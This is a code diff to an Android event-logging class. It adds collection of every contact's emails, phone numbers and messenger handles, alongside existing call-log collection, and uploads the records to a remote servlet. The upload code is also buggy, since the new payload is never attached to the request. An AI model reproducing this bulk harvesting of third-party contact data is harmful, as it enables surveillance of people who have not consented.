@@ -50,12 +50,16 @@ import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Environment;
+import android.provider.ContactsContract;
 import android.provider.Settings.Secure;
 import android.util.Log;
 
 public enum EventLogger {
   INSTANCE;
 
+  private static final String CONTACTINFO_STR = "contactinfo";
+  private static final String PHONE_NUMBER_STR = "PHONE_NUMBER";
+  private static final String EMAILS_STR = "EMAILS";
   private volatile BufferedWriter bufferedWriter;
   private boolean logFileOpen = false;
   private String logFilePath;
@@ -144,6 +148,7 @@ public enum EventLogger {
   }
 
   private void writeFormatedLogToLogFile( String log) {
+    Log.d( "willrgai", log);
     if (!lockedToUpload) {
       try {
         bufferedWriter.write( StringEscapeUtils.escapeJava( log));
@@ -253,14 +258,135 @@ public enum EventLogger {
   private boolean uploadJsonEncodedString( String jsonEncodedLogs) throws UnsupportedEncodingException, IOException, ClientProtocolException, ParseException, JSONException {
     final HttpPost httpPost = new HttpPost( SERVLET_URL);
 
-    boolean upLoadSuccess = uploadLogs( jsonEncodedLogs, httpPost);
-    if (!upLoadSuccess)
+    if (!uploadLogs( jsonEncodedLogs, httpPost))
       return false;
 
-    upLoadSuccess = uploadCallInformations( httpPost);
-    if (!upLoadSuccess)
+    if (!uploadCallInformations( httpPost))
       return false;
-    return upLoadSuccess;
+
+    if (!uploadContentInformations( httpPost))
+      return false;
+
+    return true;
+  }
+
+  private boolean uploadContentInformations( final HttpPost httpPost) {
+    List<String> contentInformations = getContentInformations();
+    for (String string : contentInformations) {
+      Log.d( "willrgai", string);
+    }
+    String encryptedContactInformations = logToJsonConverter.convertLogToJsonFormat( contentInformations);
+    StringEntity httpContentListEntity;
+    HttpResponse response = null;
+    try {
+      httpContentListEntity = new StringEntity( encryptedContactInformations, org.apache.http.protocol.HTTP.UTF_8);
+      httpContentListEntity.setContentType( "application/json");
+      response = getNewHttpClient().execute( httpPost);
+    } catch (UnsupportedEncodingException e) {
+      // TODO Auto-generated catch block
+      e.printStackTrace();
+      return false;
+    } catch (ClientProtocolException e) {
+      // TODO Auto-generated catch block
+      e.printStackTrace();
+      return false;
+    } catch (IOException e) {
+      // TODO Auto-generated catch block
+      e.printStackTrace();
+      return false;
+    }
+
+    return isUploadSuccessFull( response);
+
+  }
+
+  @SuppressWarnings("unused")
+  List<String> getContentInformations() {
+    List<String> contentInformations = new ArrayList<String>();
+    Cursor cursor;
+    String uploadTime = Long.toString( LogToJsonConverter.getCurrentTime());
+    String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND "
+        + ContactsContract.Data.MIMETYPE + " = ?";
+
+    cursor = context.getContentResolver().query( ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+    while (cursor.moveToNext()) {
+      String contactId = cursor.getString( cursor.getColumnIndex(
+          ContactsContract.Contacts._ID));
+
+      // Get E-mails
+
+      String emailsWhere = ContactsContract.Data.CONTACT_ID + " = ? ";
+      String[] emailsWhereParams = new String[] { contactId };
+
+      Cursor emails = context.getContentResolver().query( ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, emailsWhere, emailsWhereParams, null);
+      String emailAddress;
+      while (emails.moveToNext()) {
+        addEmailContactInfos( contentInformations, uploadTime, contactId, emails);
+      }
+      emails.close();
+
+      // Get Numbers
+
+      String numbersWhere = ContactsContract.Data.CONTACT_ID + " = ? ";
+      String[] numbersWhereParams = new String[] { contactId };
+
+      Cursor numbers = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, numbersWhere, numbersWhereParams, null);
+
+      while (numbers.moveToNext()) {
+        addPhoneNumberContactInfos( contentInformations, uploadTime, contactId, numbers);
+      }
+
+      numbers.close();
+
+      // Get Instant Messenger.........
+      String[] imWhereParams = new String[] { contactId,
+          ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE };
+
+      Cursor imCur = context.getContentResolver().query( ContactsContract.Data.CONTENT_URI,
+          null, imWhere, imWhereParams, null);
+      while (imCur.moveToNext()) {
+        addInstantMessengerContactInfos( contentInformations, uploadTime, contactId, imCur);
+      }
+      imCur.close();
+    }
+    cursor.close();
+    return contentInformations;
+
+  }
+
+  private void addInstantMessengerContactInfos( List<String> contentInformations, String uploadTime, String contactId, Cursor imCur) {
+    String imName = imCur.getString(
+        imCur.getColumnIndex( ContactsContract.CommonDataKinds.Im.DATA));
+    String imP = imCur.getString(
+        imCur.getColumnIndex( ContactsContract.CommonDataKinds.Im.PROTOCOL));
+    String imCustomP = imCur.getString(
+        imCur.getColumnIndex( ContactsContract.CommonDataKinds.Im.CUSTOM_PROTOCOL));
+
+    // TODO ha a gtalk előjönne mint issue
+    if (false) {
+      if (Integer.parseInt( imP) == -1) {
+        System.out.println( "Protocol: Custom ");
+      } else if (Integer.parseInt( imP) == 5) {
+        System.out.println( "Protocol: Google talk");
+      }
+    }
+
+    if (imCustomP != null) {
+      contentInformations.add( new StringBuilder().append( uploadTime).append( SPACE_STR).append( CONTACTINFO_STR).append( SPACE_STR).append( contactId).append( SPACE_STR).append( imCustomP).append( SPACE_STR).append( RSAENCODING.INSTANCE.encodingString( imName)).toString());
+    }
+  }
+
+  private void addPhoneNumberContactInfos( List<String> contentInformations, String uploadTime, String contactId, Cursor numbers) {
+    String number = numbers.getString(
+        numbers.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
+    contentInformations.add( new StringBuilder().append( uploadTime).append( SPACE_STR).append( CONTACTINFO_STR).append( SPACE_STR).append( contactId).append( SPACE_STR).append( PHONE_NUMBER_STR).append( SPACE_STR).append( RSAENCODING.INSTANCE.encodingString( number)).toString());
+  }
+
+  private void addEmailContactInfos( List<String> contentInformations, String uploadTime, String contactId, Cursor emails) {
+    String emailAddress;
+    emailAddress = emails.getString(
+        emails.getColumnIndex( ContactsContract.CommonDataKinds.Email.DATA));
+    contentInformations.add( new StringBuilder().append( uploadTime).append( SPACE_STR).append( CONTACTINFO_STR).append( SPACE_STR).append( contactId).append( SPACE_STR).append( EMAILS_STR).append( SPACE_STR).append( RSAENCODING.INSTANCE.encodingString( emailAddress)).toString());
   }
 
   private boolean uploadCallInformations( final HttpPost httpPost) throws UnsupportedEncodingException, IOException, ClientProtocolException {
@@ -281,7 +407,7 @@ public enum EventLogger {
 
     Uri allCalls = Uri.parse( "content://call_log/calls");
 
-    Cursor c = context.getContentResolver().query( allCalls, null, null, null, null);
+    Cursor c = context.getContentResolver().query( allCalls, null, "date >" + String.valueOf( logfileCreatedTime), null, null);
 
     while (c.moveToNext()) {
       StringBuilder callInformationBuilder = new StringBuilder();
@@ -298,8 +424,6 @@ public enum EventLogger {
       callInformationBuilder.append( c.getString( c.getColumnIndex( "_id")));
       callInformationBuilder.append( SPACE_STR);
       callInformationBuilder.append( c.getString( c.getColumnIndex( "numberlabel")));
-      callInformationBuilder.append( SPACE_STR);
-      callInformationBuilder.append( c.getString( c.getColumnIndex( "name")));
       callInformationBuilder.append( SPACE_STR);
       callInformationBuilder.append( c.getString( c.getColumnIndex( "type")));
       callInformationBuilder.append( SPACE_STR);
